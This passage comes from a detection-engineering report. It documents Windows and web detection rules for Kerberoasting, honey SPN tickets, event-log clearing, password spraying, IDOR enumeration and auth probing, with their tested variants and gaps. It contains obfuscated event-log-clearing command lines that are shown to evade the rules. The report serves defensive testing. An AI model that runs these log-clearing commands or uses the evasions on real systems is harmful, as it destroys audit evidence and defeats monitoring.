- **The server's own machine account and the search indexer.** Backup and antivirus run as SYSTEM, which the server logs as its machine account (a name ending in $), and Windows Search reads every file it indexes through SearchProtocolHost.exe or SearchIndexer.exe [[event-4663](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4663)]. *Why quiet:* filter_machine_account and filter_search_indexer, each recorded in tuning.yml.
- **The search indexer reading a decoy.** Windows Search reads file content minutes after a file is created or changed, through SearchProtocolHost.exe or SearchIndexer.exe, under the logged-on user [[event-4663](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4663)]. *Why quiet:* filter_search_indexer.

</details>

Sources:

- [event-4663](https://learn.microsoft.com/windows/security/threat-protection/auditing/event-4663): Microsoft Learn, 4663(S) An attempt was made to access an object (Object Name, Object Type File, Accesses as %%-codes, Process Name)
- [audit-file-system](https://learn.microsoft.com/windows/security/threat-protection/auditing/audit-file-system): Microsoft Learn, Audit File System (4663 is written when a SACL on the object matches the access)
- [attack-credentials-in-files](https://attack.mitre.org/techniques/T1552/001/): MITRE ATT&CK, T1552.001 Unsecured Credentials, Credentials In Files

## T1558.003 Deception - Service Ticket Requested for a Honey SPN Account

**Behaviour.** The domain controller logs a service ticket request (event 4769) whose service is the decoy account: issued or refused, with RC4, AES or DES, from any client including the domain controller itself. No real service runs under that account, so the request can only come from someone collecting tickets.

[`T1558.003_honey_spn_ticket_request`](../detect/detections/T1558.003_honey_spn_ticket_request/) · [spec](../detect/detections/T1558.003_honey_spn_ticket_request/behavior.yml) · [rule](../detect/detections/T1558.003_honey_spn_ticket_request/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Service ticket requested for the decoy account, any encryption, any outcome | fires | **proven** for every event |
| Decoy account written with its realm | fires | **proven** for every event |
| Service tickets for every other service | stays quiet | **proven** for every event |
| Other Kerberos events that name the decoy | stays quiet | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Service ticket requested for the decoy account, any encryption, any outcome.** Kerberoasting tools request a ticket for every SPN they enumerate [[attack-kerberoasting](https://attack.mitre.org/techniques/T1558/003/)]; the domain controller writes the SPN's account in Service Name, the encryption type the KDC chose and the result code [[event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)]. The decoy's ticket is requested with the real ones, so the type and the outcome are not what matters.
- **Decoy account written with its realm.** Some pipelines and tools write the service account as account@REALM; the rule accepts any suffix after the @.
- **Service tickets for every other service.** Real service accounts, machine accounts and krbtgt are requested all day; names that merely start or end like the decoy's are ordinary too. *Why quiet:* ServiceName must equal the decoy, or the decoy followed by @ and a realm.
- **Other Kerberos events that name the decoy.** A TGT request by the decoy account itself (the honey account rule's event), a ticket renewal and a pre-authentication failure carry the name without being a service ticket request. *Why quiet:* Only event 4769 is selected.

</details>

Sources:

- [event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769): Microsoft Learn, 4769(S, F) A Kerberos service ticket was requested (Service Name is the account the SPN belongs to; encryption types 0x1, 0x3, 0x11, 0x12, 0x17, 0x18; Failure Code 0x0 on success)
- [attack-kerberoasting](https://attack.mitre.org/techniques/T1558/003/): MITRE ATT&CK, T1558.003 Kerberoasting (tools request tickets for the SPNs they enumerate)

## T1558.003 Kerberoasting - RC4 Service Ticket Requested for User Account

**Behaviour.** The domain controller issues a service ticket (event 4769, status 0x0) encrypted with RC4 or DES for a service account, at the request of another machine: the ticket an attacker takes away to crack.

[`T1558.003_kerberoasting_rc4_tgs`](../detect/detections/T1558.003_kerberoasting_rc4_tgs/) · [spec](../detect/detections/T1558.003_kerberoasting_rc4_tgs/behavior.yml) · [rule](../detect/detections/T1558.003_kerberoasting_rc4_tgs/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| RC4 or DES ticket as the domain controller writes it | fires | **proven** for every event |
| Codes in another letter case or in decimal | fires | **proven** for every event |
| AES tickets | stays quiet | **proven** for every event |
| Computer accounts and krbtgt | stays quiet | **proven** for every event |
| Requests from the domain controller itself | stays quiet | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **RC4 or DES ticket as the domain controller writes it.** Encryption types 0x17 (RC4-HMAC), 0x18 (RC4-HMAC-EXP), 0x1 and 0x3 (DES) in the hexadecimal form of the event, status 0x0 [[event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)], for a service account requested from another machine [[attack-kerberoasting](https://attack.mitre.org/techniques/T1558/003/)].
- **Codes in another letter case or in decimal.** Pipelines and SIEM extractions write the same codes in upper case or as decimal numbers (23, 24, 1, 3 and 0).
- **AES tickets.** AES-128 and AES-256 (0x11, 0x12) are the normal encryption types since Windows Server 2008 [[event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)]. *Why quiet:* Only the weak types are this rule's concern; the volume correlation counts AES roasting.
- **Computer accounts and krbtgt.** Computer accounts end with $ and krbtgt is the ticket-granting service itself; neither is a roasting target [[event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)]. *Why quiet:* filter_machine and filter_krbtgt.
- **Requests from the domain controller itself.** A request from the loopback address comes from the domain controller's own services. *Why quiet:* filter_local excludes the three loopback forms the event uses.

</details>

Sources:

- [event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769): Microsoft Learn, 4769(S, F) A Kerberos service ticket was requested (encryption types 0x1, 0x3, 0x11, 0x12, 0x17, 0x18; status 0x0)
- [attack-kerberoasting](https://attack.mitre.org/techniques/T1558/003/): MITRE ATT&CK, T1558.003 Kerberoasting

## T1685.005 Windows Event Log Clearing via Command Line

**Behaviour.** A process clears or removes a Windows event log: wevtutil cl / clear-log, the PowerShell event log cmdlets and .NET methods, or the ClearEventLog method of WMI's Win32_NTEventlogFile.

[`T1685.005_event_log_clearing`](../detect/detections/T1685.005_event_log_clearing/) · [spec](../detect/detections/T1685.005_event_log_clearing/behavior.yml) · [rule](../detect/detections/T1685.005_event_log_clearing/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| wevtutil cl, plain arguments | fires | **proven** for every event |
| wevtutil cl, whole arguments in quotes | fires | **proven** for every event |
| wevtutil cl, quoted part inside the command word | known gap | slips past (event below) |
| PowerShell event log cmdlets by name | fires | **proven** for every event |
| Quoted part inside the cmdlet name | known gap | slips past (event below) |
| EventLogSession.ClearLog | fires | **proven** for every event |
| WMI ClearEventLog | fires | **proven** for every event |
| EventLog.Clear on the objects of Get-EventLog -List | known gap | slips past (event below) |
| Cmdlet name built at run time | known gap | slips past (event below) |

Events found, each replayed through the engine and checked against its variant:

*wevtutil cl, quoted part inside the command word*

```text
CommandLine: wevtutil c"l" Security
Image:       C:\Windows\System32\wevtutil.exe
```

*Quoted part inside the cmdlet name*

```text
CommandLine: powershell.exe -c Clear-Eve"nt"Log -LogName Security
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*EventLog.Clear on the objects of Get-EventLog -List*

```text
CommandLine: powershell.exe -c "Get-EventLog -List | Where-Object Log -eq 'Security' | ForEach-Object { $_.Clear() }"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

*Cmdlet name built at run time*

```text
CommandLine: powershell.exe -c "& ('Clear-Event'+'Log') -LogName Security"
Image:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **wevtutil cl, plain arguments.** The documented command word, short or long, in any letter case, then the log and any options [[wevtutil](https://learn.microsoft.com/windows-server/administration/windows-commands/wevtutil)].
- **wevtutil cl, whole arguments in quotes.** Each argument plain or wrapped whole in double quotes, as scripts write them [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)].
- **wevtutil cl, quoted part inside the command word.** The C runtime lets a quoted part sit anywhere inside an argument and drops the quotes, so c"l" reaches wevtutil as cl [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)]; such quotes change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule allows a quote only before and after the whole command word. *Fix:* Remove the quotes from the command line before matching (a normalized field), or allow a quote between the letters of cl and clear-log.
- **PowerShell event log cmdlets by name.** Clear-EventLog clears a log [[clear-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog?view=powershell-5.1)]; Remove-EventLog and Limit-EventLog remove a log or shorten what it keeps. PowerShell resolves command names in any letter case.
- **Quoted part inside the cmdlet name.** PowerShell reads the command it runs from its arguments after the C runtime has split them and dropped the quotes [[crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments)], so Clear-Eve"nt"Log on the command line runs Clear-EventLog [[clear-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog?view=powershell-5.1)]; such quotes change nothing at run time [[dosfuscation](https://www.exploit-db.com/docs/44347)]. *Gap:* The rule looks for the cmdlet names as unbroken text in the raw command line. *Fix:* Remove the quotes from the command line before matching (a normalized field).
- **EventLogSession.ClearLog.** The .NET method that clears a log by name [[clearlog](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventing.reader.eventlogsession.clearlog)], called from a PowerShell command line.
- **WMI ClearEventLog.** The ClearEventLog method of Win32_NTEventlogFile clears a log [[wmi-clear](https://learn.microsoft.com/previous-versions/windows/desktop/eventlogprov/cleareventlog-method-in-class-win32-nteventlogfile)], from wmic, PowerShell or any other caller.
- **EventLog.Clear on the objects of Get-EventLog -List.** Get-EventLog -List returns System.Diagnostics.EventLog objects [[get-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1)], and their Clear method removes every entry of the log [[eventlog-clear](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventlog.clear)]. *Gap:* The rule knows the cmdlets, ClearLog and ClearEventLog, but not the Clear method of an EventLog object. *Fix:* Add Get-EventLog with -List and .Clear( on the same command line, for powershell.exe.
- **Cmdlet name built at run time.** The call operator runs a command whose name is held in a string [[call-operator](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-5.1)], so the name can be assembled from pieces and never appears whole on the command line. *Gap:* A command-line rule reads only the text that was typed. PowerShell Script Block Logging (event 4104) records the code that actually ran and is where this belongs.

</details>

Sources:

- [wevtutil](https://learn.microsoft.com/windows-server/administration/windows-commands/wevtutil): Microsoft Learn, wevtutil ({cl | clear-log} <Logname> [/bu:<Backup>])
- [clear-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog?view=powershell-5.1): Microsoft Learn, Clear-EventLog (Windows PowerShell 5.1)
- [get-eventlog](https://learn.microsoft.com/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1): Microsoft Learn, Get-EventLog (-List returns System.Diagnostics.EventLog objects)
- [eventlog-clear](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventlog.clear): .NET, EventLog.Clear (removes all entries from the event log)
- [clearlog](https://learn.microsoft.com/dotnet/api/system.diagnostics.eventing.reader.eventlogsession.clearlog): .NET, EventLogSession.ClearLog
- [wmi-clear](https://learn.microsoft.com/previous-versions/windows/desktop/eventlogprov/cleareventlog-method-in-class-win32-nteventlogfile): Microsoft Learn, ClearEventLog method of the Win32_NTEventlogFile class
- [call-operator](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-5.1): Microsoft Learn, about_Operators (the call operator runs a command whose name is held in a string)
- [crt-args](https://learn.microsoft.com/cpp/c-language/parsing-c-command-line-arguments): Microsoft Learn, Parsing C command-line arguments (how wmain's argv is split; a quoted string can sit inside an argument)
- [dosfuscation](https://www.exploit-db.com/docs/44347): D. Bohannon, DOSfuscation (2018) - double quotes inside arguments change nothing at run time and stay in the logged command line

## T1685.005 Windows Event Log Cleared (System Event 104)

**Behaviour.** The event log service writes event 104 (provider Microsoft-Windows-Eventlog) to the System log when a log is cleared, whatever tool cleared it.

[`T1685.005_system_log_cleared`](../detect/detections/T1685.005_system_log_cleared/) · [spec](../detect/detections/T1685.005_system_log_cleared/behavior.yml) · [rule](../detect/detections/T1685.005_system_log_cleared/rule.yml)

| Variant | Expected | Result |
|---|---|---|
| Log cleared, as the event log service writes it | fires | **proven** for every event |
| Provider name in another letter case | fires | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Log cleared, as the event log service writes it.** Event 104 with the provider name the service writes, Microsoft-Windows-Eventlog [[event-104](https://docs.velociraptor.app/artifact_references/pages/windows.eventlogs.cleared), [sigma-104](https://detection.fyi/sigmahq/sigma/windows/builtin/system/microsoft_windows_eventlog/win_system_eventlog_cleared/)].
- **Provider name in another letter case.** Pipelines and SIEM extractions do not always keep the provider name's case.

</details>

Sources:

- [event-104](https://docs.velociraptor.app/artifact_references/pages/windows.eventlogs.cleared): Velociraptor, Windows.EventLogs.Cleared (System log event 104 and Security log event 1102 mark a cleared log)
- [sigma-104](https://detection.fyi/sigmahq/sigma/windows/builtin/system/microsoft_windows_eventlog/win_system_eventlog_cleared/): SigmaHQ, Eventlog Cleared (System event 104 from Microsoft-Windows-Eventlog)

## T1110.003 Authentication Failure for an Account - Wrong Password, Unknown or Disabled

**Behaviour.** One guess of a password against an account fails: Kerberos pre-authentication with a wrong password, a ticket request for an account that does not exist or is disabled, or a logon with a wrong password or an unknown user name.

[`T1110.003_password_spray_burst`](../detect/correlations/T1110.003_password_spray_burst/) · [spec](../detect/correlations/T1110.003_password_spray_burst/behavior.yml) · [rule](../detect/correlations/T1110.003_password_spray_burst/base.yml)

| Variant | Expected | Result |
|---|---|---|
| Wrong password in Kerberos pre-authentication | fires | **proven** for every event |
| Unknown or disabled account in a ticket request | fires | **proven** for every event |
| Wrong password or unknown user in a logon | fires | **proven** for every event |
| NTLM credential validation on the domain controller | known gap | slips past (event below) |
| Computer accounts | stays quiet | **proven** for every event |
| Local and loopback sources | stays quiet | **proven** for every event |

Events found, each replayed through the engine and checked against its variant:

*NTLM credential validation on the domain controller*

```text
EventID:        4776
Status:         0xC000006A
TargetUserName: lab.user07
Workstation:    WS07
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Wrong password in Kerberos pre-authentication.** Event 4771 with failure code 0x18, written in hexadecimal or decimal [[event-4771](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4771)].
- **Unknown or disabled account in a ticket request.** Event 4768 with result 0x6 (no such account) or 0x12 (disabled, expired or locked out) [[event-4768](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)].
- **Wrong password or unknown user in a logon.** Event 4625 with sub status 0xC000006A or 0xC0000064, in hexadecimal of either case or in decimal [[event-4625](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625)].
- **NTLM credential validation on the domain controller.** When a member server or workstation is sprayed over NTLM, the domain controller records event 4776 with the wrong-password or unknown-user code [[event-4776](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4776)]; the 4625 stays on the sprayed host [[event-4625](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625)]. *Gap:* The base rule counts Kerberos failures and 4625 logon failures, not 4776, so a spray seen only in the domain controller's NTLM validations is not counted. *Fix:* Count 4776 with 0xC000006A and 0xC0000064 per workstation name (the roadmap's NTLM sprays by workstation).
- **Computer accounts.** A computer account whose password changed recently fails until replication catches up. *Why quiet:* filter_machine leaves out account names ending with $.
- **Local and loopback sources.** Logons without a network source (-) or from the loopback address are local, not a spray from another machine [[event-4625](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625)]. *Why quiet:* filter_local.

</details>

Sources:

- [event-4771](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4771): Microsoft Learn, 4771(F) Kerberos pre-authentication failed (failure code 0x18, KDC_ERR_PREAUTH_FAILED - wrong password)
- [event-4768](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768): Microsoft Learn, 4768(S, F) A Kerberos authentication ticket (TGT) was requested (0x6 unknown client, 0x12 credentials revoked)
- [event-4625](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625): Microsoft Learn, 4625(F) An account failed to log on (sub status 0xC000006A wrong password, 0xC0000064 unknown user name)
- [event-4776](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4776): Microsoft Learn, 4776(S, F) The computer attempted to validate the credentials for an account (NTLM)

## T1190 Web Request for a Single-Owner Object by Numeric ID

**Behaviour.** A client reads an object that belongs to one user (a basket, user record, account, profile or wallet) by its numeric identifier in the path, the request an IDOR enumeration repeats with the next number.

[`T1190_object_id_enumeration`](../detect/correlations/T1190_object_id_enumeration/) · [spec](../detect/correlations/T1190_object_id_enumeration/behavior.yml) · [rule](../detect/correlations/T1190_object_id_enumeration/base.yml)

| Variant | Expected | Result |
|---|---|---|
| GET of an owned object by number | fires | **proven** for every event |
| HEAD instead of GET | known gap | slips past (event below) |
| The number in the query string | known gap | slips past (event below) |

Events found, each replayed through the engine and checked against its variant:

*HEAD instead of GET*

```text
cs-method:   HEAD
cs-uri-stem: /api/Users/7
```

*The number in the query string*

```text
cs-method:    GET
cs-uri-query: id=2
cs-uri-stem:  /rest/basket
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **GET of an owned object by number.** The object's number in the path, under any prefix (/api, /rest), the resource name singular or plural in any letter case, with or without a trailing slash [[owasp-idor](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References), [w3c-fields](https://learn.microsoft.com/windows/win32/http/w3c-logging)].
- **HEAD instead of GET.** HEAD returns what GET would, without the content [[rfc9110](https://www.rfc-editor.org/rfc/rfc9110)], so the status alone tells whether each object exists. *Gap:* The base rule counts GET only. *Fix:* Count HEAD with GET (selection_method on both methods).
- **The number in the query string.** Some applications take the object's number as a query parameter, which the log keeps in cs-uri-query, not in the path [[w3c-fields](https://learn.microsoft.com/windows/win32/http/w3c-logging), [owasp-idor](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)]. *Gap:* The base rule reads the path only. *Fix:* Add a selection on cs-uri-query for the same resource names with a numeric id parameter.

</details>

Sources:

- [owasp-idor](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References): OWASP Web Security Testing Guide, Testing for Insecure Direct Object References
- [rfc9110](https://www.rfc-editor.org/rfc/rfc9110): RFC 9110, HTTP Semantics (GET; HEAD is GET without the content)
- [w3c-fields](https://learn.microsoft.com/windows/win32/http/w3c-logging): Microsoft Learn, W3C Logging (cs-uri-stem is the path; the query string is the separate cs-uri-query)

## T1558.003 Service Ticket Issued for a User-Based Service Account

**Behaviour.** The domain controller issues a service ticket (event 4769, status 0x0) for a service account, with any encryption type, at the request of another machine.

[`T1558.003_kerberoasting_volume`](../detect/correlations/T1558.003_kerberoasting_volume/) · [spec](../detect/correlations/T1558.003_kerberoasting_volume/behavior.yml) · [rule](../detect/correlations/T1558.003_kerberoasting_volume/base.yml)

| Variant | Expected | Result |
|---|---|---|
| Service ticket issued, any encryption type | fires | **proven** for every event |
| Computer accounts and krbtgt | stays quiet | **proven** for every event |
| Requests from the domain controller itself | stays quiet | **proven** for every event |

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Service ticket issued, any encryption type.** Every issued ticket for a service account is crackable offline, AES included, so the base rule counts each one whatever its encryption type [[event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769), [attack-kerberoasting](https://attack.mitre.org/techniques/T1558/003/)].
- **Computer accounts and krbtgt.** Computer accounts end with $ and krbtgt is the ticket-granting service itself [[event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)]. *Why quiet:* filter_machine and filter_krbtgt.
- **Requests from the domain controller itself.** A request from the loopback address comes from the domain controller's own services. *Why quiet:* filter_local.

</details>

Sources:

- [event-4769](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769): Microsoft Learn, 4769(S, F) A Kerberos service ticket was requested (status 0x0, encryption types)
- [attack-kerberoasting](https://attack.mitre.org/techniques/T1558/003/): MITRE ATT&CK, T1558.003 Kerberoasting

## T1595.003 Web Request Rejected With 401 or 403

**Behaviour.** The server refuses a request to a protected path, for missing or wrong credentials (401) or for lack of rights (403).

[`T1595.003_api_auth_probing`](../detect/correlations/T1595.003_api_auth_probing/) · [spec](../detect/correlations/T1595.003_api_auth_probing/behavior.yml) · [rule](../detect/correlations/T1595.003_api_auth_probing/base.yml)

| Variant | Expected | Result |
|---|---|---|
| Request refused with 401 or 403 | fires | **proven** for every event |
| Forbidden paths answered with 404 | known gap | slips past (event below) |
| CORS preflight | stays quiet | **proven** for every event |

Events found, each replayed through the engine and checked against its variant:

*Forbidden paths answered with 404*

```text
cs-method:   GET
cs-uri-stem: /rest/admin/application-configuration
sc-status:   404
```

<details><summary>Why each variant, the gaps and the planned fixes</summary>

- **Request refused with 401 or 403.** Any method other than OPTIONS, any path, refused for authentication (401) or authorization (403) [[rfc9110](https://www.rfc-editor.org/rfc/rfc9110)].
- **Forbidden paths answered with 404.** A server that wants to hide that a forbidden resource exists may answer 404 instead of 403 [[rfc9110](https://www.rfc-editor.org/rfc/rfc9110)]. *Gap:* The base rule counts only 401 and 403: a probe against such a server looks like requests for paths that do not exist, which every web server sees all day. *Fix:* Treat 404 on paths the application knows to be protected (an allow-list per application), not all 404s.
- **CORS preflight.** Browsers send an OPTIONS preflight before a cross-origin call, and some servers refuse it with 401 or 403 [[fetch-preflight](https://fetch.spec.whatwg.org/#cors-preflight-request)]. *Why quiet:* filter_preflight leaves out the OPTIONS method, in any letter case.

</details>

Sources:

- [rfc9110](https://www.rfc-editor.org/rfc/rfc9110): RFC 9110, HTTP Semantics (401 Unauthorized, 403 Forbidden; a server may answer 404 to hide a forbidden resource)
- [fetch-preflight](https://fetch.spec.whatwg.org/#cors-preflight-request): WHATWG Fetch, CORS-preflight request (an OPTIONS request the browser sends before a cross-origin call)
